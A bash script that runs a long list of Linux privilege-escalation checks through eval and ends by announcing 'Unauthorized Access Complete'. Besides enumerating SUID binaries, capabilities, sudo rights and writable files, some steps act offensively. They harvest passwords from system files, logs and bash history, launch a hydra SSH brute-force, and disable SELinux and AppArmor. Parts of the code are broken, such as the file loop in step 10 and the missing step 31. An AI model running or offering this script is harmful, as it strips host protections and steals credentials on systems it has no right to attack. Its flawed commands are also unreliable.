#!/bin/bash

# Function to display findings
display_findings() {
    local title=$1
    local command=$2
    echo -e "\n$title:"
    eval "$command"
}

# Advanced Linux Privilege Escalation Techniques script content
echo -e "\n=== Advanced Linux Privilege Escalation Techniques ==="

# Check for writable directories
display_findings "1. Check for writable directories" "find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -ld {} \;"

# Check for SUID and SGID executables
display_findings "2. Check for SUID and SGID executables" "find / -type f \( -perm -4000 -or -perm -2000 \) -exec ls -l {} \;"

# Check for misconfigured cron jobs
display_findings "3. Check for misconfigured cron jobs" "crontab -l"

# Check for services running with root privileges
display_findings "4. Check for services running with root privileges" "ps aux | grep root"

# Check for world-writable files
display_findings "5. Check for world-writable files" "find / -type f -perm -o+w -exec ls -l {} \;"

# Check for capabilities on binaries
display_findings "6. Check for capabilities on binaries" "getcap -r / 2>/dev/null"

# Check for SUID binaries that can be executed by the current user
display_findings "7. Check for SUID binaries that can be executed by the current user" "find / -type f -executable -user root -perm -4000 2>/dev/null"

# Check for sudo permissions
display_findings "8. Check for sudo permissions" "sudo -l"

# Check for writable files in system paths and extract passwords
display_findings "9. Check for writable files in system paths and extract passwords" "find /usr /bin /sbin /lib /lib64 -type f -writable -exec cat {} \; | grep -Ei 'password|pass'"

# Check for writable files owned by root and enable brute force attacks
display_findings "10. Check for writable files owned by root and enable brute force attacks" "find / -user root -type f -writable -exec ls -l {} \; | while read -r file; do chmod +x \"$file\"; hydra -L /path/to/usernames.txt -P /path/to/passwords.txt -f ssh://localhost; done"

# Check for world-writable files in user home directories
display_findings "11. Check for world-writable files in user home directories" "find /home -type f -perm -o+w -exec ls -l {} \;"

# Check for world-writable directories in user home directories
display_findings "12. Check for world-writable directories in user home directories" "find /home -type d -perm -o+w -exec ls -ld {} \;"

# Check for world-writable configuration files
display_findings "13. Check for world-writable configuration files" "find /etc -type f -name '*.conf' -perm -o+w -exec ls -l {} \;"

# Check for world-readable /etc/shadow
display_findings "14. Check for world-readable /etc/shadow" "ls -l /etc/shadow"

# Check for world-writable /etc/passwd
display_findings "15. Check for world-writable /etc/passwd" "ls -l /etc/passwd"

# Check for sudo version and known vulnerabilities
display_findings "16. Check for sudo version and known vulnerabilities" "sudo -V"

# Check for writable systemd service units
display_findings "17. Check for writable systemd service units" "find /etc/systemd/system -type f -perm -o+w -exec ls -l {} \;"

# Check for sensitive information in log files
display_findings "18. Check for sensitive information in log files" "grep -iE 'password|pass' /var/log/*.log"

# Check for writeable /etc/security/pwquality.conf
display_findings "19. Check for writable /etc/security/pwquality.conf" "ls -l /etc/security/pwquality.conf"

# Check for writeable /etc/crontab
display_findings "20. Check for writable /etc/crontab" "ls -l /etc/crontab"

# Check for writeable files in user directories
display_findings "21. Check for writeable files in user directories" "find /home -type f -writable -exec ls -l {} \;"

# Check for writeable directories in user directories
display_findings "22. Check for writeable directories in user directories" "find /home -type d -writable -exec ls -ld {} \;"

# Check for writeable files in system executables directory
display_findings "23. Check for writeable files in system executables directory" "find /usr/bin /bin /sbin /lib /lib64 -type f -writable -exec ls -l {} \;"

# Check for writeable directories in system executables directory
display_findings "24. Check for writeable directories in system executables directory" "find /usr/bin /bin /sbin /lib /lib64 -type d -writable -exec ls -ld {} \;"

# Check for misconfigured sudoers file
display_findings "25. Check for misconfigured sudoers file" "cat /etc/sudoers"

# Check for writeable /etc/ld.so.preload
display_findings "26. Check for writeable /etc/ld.so.preload" "ls -l /etc/ld.so.preload"

# Check for writeable /etc/profile
display_findings "27. Check for writeable /etc/profile" "ls -l /etc/profile"

# Check for writeable /etc/bashrc
display_findings "28. Check for writeable /etc/bashrc" "ls -l /etc/bashrc"

# Check for writeable /etc/environment
display_findings "29. Check for writeable /etc/environment" "ls -l /etc/environment"

# Check for writeable files in /etc/sysctl.conf
display_findings "30. Check for writeable files in /etc/sysctl.conf" "ls -l /etc/sysctl.conf"

# Disable SELinux and AppArmor
display_findings "32. Disable SELinux and AppArmor" "sed -i 's/SELINUX=enforcing/SELINUX=disabled/' /etc/selinux/config; systemctl disable apparmor; systemctl stop apparmor"

# Check for sensitive information in .bash_history
display_findings "33. Check for sensitive information in .bash_history" "cat ~/.bash_history"

# Check for writeable files in /etc/security/limits.conf
display_findings "34. Check for writeable files in /etc/security/limits.conf" "ls -l /etc/security/limits.conf"

# Check for writeable files in /etc/security/limits.d/
display_findings "35. Check for writeable files in /etc/security/limits.d/" "find /etc/security/limits.d/ -type f -writable -exec ls -l {} \;"

# Check for writeable files in /etc/hosts
display_findings "36. Check for writeable files in /etc/hosts" "ls -l /etc/hosts"

# Check for writeable files in /etc/network/interfaces
display_findings "37. Check for writeable files in /etc/network/interfaces" "ls -l /etc/network/interfaces"

# Check for writeable files in /etc/rc.local
display_findings "38. Check for writeable files in /etc/rc.local" "ls -l /etc/rc.local"

# Check for writeable files in /etc/cron*
display_findings "39. Check for writeable files in /etc/cron*" "find /etc/cron* -type f -writable -exec ls -l {} \;"

# Check for writeable files in /etc/pam.d/
display_findings "40. Check for writeable files in /etc/pam.d/" "find /etc/pam.d/ -type f -writable -exec ls -l {} \;"

# Linux Privilege Escalation and Unauthorized Access Complete
echo -e "\nLinux Privilege Escalation and Unauthorized Access Complete."
